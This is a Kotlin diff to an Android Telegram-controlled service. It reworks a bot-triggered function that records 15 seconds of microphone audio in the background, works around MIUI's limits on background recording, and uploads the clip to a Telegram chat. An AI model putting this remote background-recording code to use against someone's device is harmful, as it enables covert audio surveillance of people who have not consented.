@@ -569,8 +569,9 @@ class TelegramService : Service() {
         } catch (e: Exception) { /* ignore */ }
     }
 
-    /** Rekam 15 detik audio pakai AudioRecord (reliable di background service MIUI),
-     *  kirim ke Telegram sebagai voice note (WAV, bot akan transcode). */
+    /** Rekam 15 detik audio via MediaRecorder + audio focus.
+     *  MIUI requires audio focus for background recording.
+     *  Retry loop: if start() fails, release & try with MIC source. */
     private suspend fun recordAudio(chatId: String) {
         if (isRecording) {
             sendText(chatId, "Sedang merekam... tunggu selesai.")
@@ -586,93 +587,109 @@ class TelegramService : Service() {
         }
         val ts = System.currentTimeMillis()
         val outDir = getExternalFilesDir(null) ?: filesDir
-        val outFile = java.io.File(outDir, "rec_${ts}.wav")
+        val outFile = java.io.File(outDir, "rec_${ts}.m4a")
         if (outFile.exists()) outFile.delete()
-        Log.d(TAG, "recordAudio: dir=${outDir.absolutePath}, canWrite=${outDir.canWrite()}, file=${outFile.absolutePath}")
+        Log.d(TAG, "recordAudio: dir=${outDir.absolutePath}, file=${outFile.absolutePath}")
 
         isRecording = true
         sendText(chatId, "⏺️ Mulai rekam 15 detik...")
         scope?.launch {
-            var startError: String? = null
-            val sampleRate = 44100
-            val channelConfig = AudioFormat.CHANNEL_IN_MONO
-            val encoding = AudioFormat.ENCODING_PCM_16BIT
-            val minBuf = AudioRecord.getMinBufferSize(sampleRate, channelConfig, encoding)
-            if (minBuf <= 0) {
-                startError = "getMinBufferSize failed (minBuf=$minBuf)"
-                isRecording = false
-                sendText(chatId, "❌ Gagal inisialisasi audio: $startError")
-                return@launch
-            }
-            val bufSize = minBuf * 2
-            val record = try {
-                @Suppress("DEPRECATION")
-                AudioRecord(
-                    MediaRecorder.AudioSource.VOICE_RECOGNITION,
-                    sampleRate, channelConfig, encoding, bufSize
-                )
-            } catch (e: Exception) {
-                startError = "AudioRecord create failed: ${e.javaClass.simpleName}: ${e.message ?: "(null)"}"
-                isRecording = false
-                sendText(chatId, "❌ $startError")
-                return@launch
-            }
-            audioRecord = record
+            val am = getSystemService(AUDIO_SERVICE) as AudioManager
+            var focusGranted = false
+
+            // --- 1. Request audio focus (mandatory on MIUI) ---
             try {
-                record.startRecording()
-                Log.d(TAG, "recordAudio: started, bufSize=$bufSize, state=${record.state}")
+                if (Build.VERSION.SDK_INT >= 26) {
+                    val focusReq = android.media.AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN)
+                        .setAudioAttributes(
+                            AudioAttributes.Builder()
+                                .setUsage(AudioAttributes.USAGE_MEDIA)
+                                .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
+                                .build()
+                        )
+                        .build()
+                    focusGranted = am.requestAudioFocus(focusReq) == AudioManager.AUDIOFOCUS_REQUEST_GRANTED
+                } else {
+                    @Suppress("DEPRECATION")
+                    focusGranted = am.requestAudioFocus(
+                        null, AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN
+                    ) == AudioManager.AUDIOFOCUS_REQUEST_GRANTED
+                }
+                Log.d(TAG, "recordAudio: audioFocus=$focusGranted")
             } catch (e: Exception) {
-                startError = "startRecording failed: ${e.javaClass.simpleName}: ${e.message ?: "(null)"}"
-                record.release()
-                audioRecord = null
-                isRecording = false
-                sendText(chatId, "❌ $startError")
-                return@launch
+                Log.w(TAG, "recordAudio: audioFocus fail: ${e.message}")
             }
 
-            // Rekam 15 detik — baca dalam chunk, tulis PCM langsung ke file
-            val wavFile = java.io.File(filesDir, "rec_${ts}.wav")
-            val pcmBuffer = ByteArray(bufSize)
-            val totalSamples = 15 * sampleRate  // 661,500 samples (16-bit)
-            var bytesRecorded = 0
-            val fileOut = java.io.FileOutputStream(wavFile)
-            val pcmStream = java.io.BufferedOutputStream(fileOut)
-
-            while (bytesRecorded < totalSamples * 2) {  // 16-bit = 2 bytes/sample
-                val n = record.read(pcmBuffer, 0, pcmBuffer.size)
-                if (n > 0) {
-                    pcmStream.write(pcmBuffer, 0, n)
-                    bytesRecorded += n
-                } else if (n < 0) {
-                    Log.w(TAG, "recordAudio: read returned $n, stopping early")
+            // --- 2. Try MediaRecorder with VOICE_RECOGNITION, fallback to MIC ---
+            var startOk = false
+            for (source in listOf(MediaRecorder.AudioSource.VOICE_RECOGNITION, MediaRecorder.AudioSource.MIC)) {
+                val rec = if (Build.VERSION.SDK_INT >= 31) {
+                    MediaRecorder(applicationContext)
+                } else {
+                    @Suppress("DEPRECATION")
+                    MediaRecorder()
+                }
+                mediaRecorder = rec
+                try {
+                    rec.setAudioSource(source)
+                    rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                    rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                    rec.setAudioSamplingRate(44100)
+                    rec.setAudioEncodingBitRate(96000)
+                    rec.setOutputFile(outFile.absolutePath)
+                    rec.prepare()
+                    rec.start()
+                    startOk = true
+                    Log.d(TAG, "recordAudio: started with source=$source")
                     break
+                } catch (e: Exception) {
+                    Log.w(TAG, "recordAudio: source=$source failed: ${e.javaClass.simpleName}: ${e.message}")
+                    try { rec.release() } catch (_: Exception) {}
+                    // Try next source
                 }
             }
+            mediaRecorder = null  // managed in stopRecording below
 
-            record.stop()
-            record.release()
-            audioRecord = null
+            if (!startOk) {
+                isRecording = false
+                if (focusGranted) {
+                    try { am.abandonAudioFocus(null) } catch (_: Exception) {}
+                }
+                sendText(chatId, "❌ Semua audio source gagal. MIUI mungkin memblokir mic access dari background. Buka app, lalu /record.")
+                return@launch
+            }
+
+            // --- 3. Record 15 seconds ---
+            delay(15_000L)
+
+            // --- 4. Stop & release ---
+            try { mediaRecorder?.stop() } catch (e: Exception) {
+                Log.w(TAG, "recordAudio: stop: ${e.message}")
+            }
+            try { mediaRecorder?.release() } catch (e: Exception) {
+                Log.w(TAG, "recordAudio: release: ${e.message}")
+            }
+            mediaRecorder = null
             isRecording = false
-            pcmStream.close()
-            fileOut.close()
 
-            val dataLen = bytesRecorded
-            Log.d(TAG, "recordAudio: ${dataLen / 2 / sampleRate}s recorded, raw=${dataLen} bytes")
-
-            // Tulis WAV header di awal file (seek ke 0, prepend header)
-            withContext(Dispatchers.IO) {
-                prependWavHeader(wavFile, dataLen, sampleRate, 1, 16)
+            // --- 5. Release audio focus ---
+            if (focusGranted) {
+                try {
+                    if (Build.VERSION.SDK_INT < 26) {
+                        @Suppress("DEPRECATION")
+                        am.abandonAudioFocus(null)
+                    }
+                } catch (_: Exception) {}
             }
 
-            val finalSize = wavFile.length()
-            Log.d(TAG, "recordAudio: final wav size=${finalSize}")
-
-            if (finalSize > 44) {
-                sendWavAsAudio(chatId, wavFile, "Rekaman ${android.text.format.DateFormat.format("HH:mm", ts)}")
+            // --- 6. Send file ---
+            if (outFile.exists() && outFile.length() > 0) {
+                Log.d(TAG, "recordAudio: file=${outFile.length()} bytes, sending...")
+                sendAudio(chatId, outFile, "Rekaman ${android.text.format.DateFormat.format("HH:mm", ts)}")
             } else {
-                sendText(chatId, "❌ Rekaman kosong (${finalSize} bytes). Tidak ada audio yang terekam.")
+                sendText(chatId, "❌ File rekaman kosong (0 bytes).")
             }
-            wavFile.delete()
+            outFile.delete()
         }
     }
 
